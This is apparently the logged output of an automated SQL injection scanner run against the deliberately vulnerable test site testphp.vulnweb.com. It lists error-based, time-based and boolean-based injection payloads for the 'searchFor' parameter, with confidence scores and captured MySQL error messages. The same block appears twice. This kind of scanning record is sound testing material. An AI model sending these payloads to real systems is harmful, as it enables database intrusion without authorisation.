+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
